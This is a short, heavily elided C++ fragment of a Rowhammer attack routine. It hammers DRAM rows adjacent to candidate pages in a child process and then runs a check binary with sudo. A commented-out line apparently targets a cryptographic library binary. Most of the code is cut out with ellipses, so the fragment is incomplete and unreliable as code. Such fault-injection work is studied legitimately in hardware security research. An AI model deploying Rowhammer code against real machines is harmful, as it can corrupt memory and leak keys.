...
void rowhammerAttack(vector<PageCandidate> &pages) {
    ...
    if(pid == 0) {
        ...
        while(hammer) {
                ...
                for(int pNum = 0; pNum < 2; pNum++) {
                    rowhammer(pages[pNum].aboveVA[0], pages[pNum].belowVA[0], 2000000, togs);
                }
        }
	...
	sleep(1);
        for(int i = 0; i < STACK_SIZE; i++) {
          ...
          //          uint8_t* moverVA = (uint8_t*) memory;
    	//while (moverVA < (((uint8_t*) memory) + 4096*1000)) {
	...
	int ok = system("sudo taskset -c 2 ./check");
        //int ok = system("taskset 0x4 ../relic-main/main");
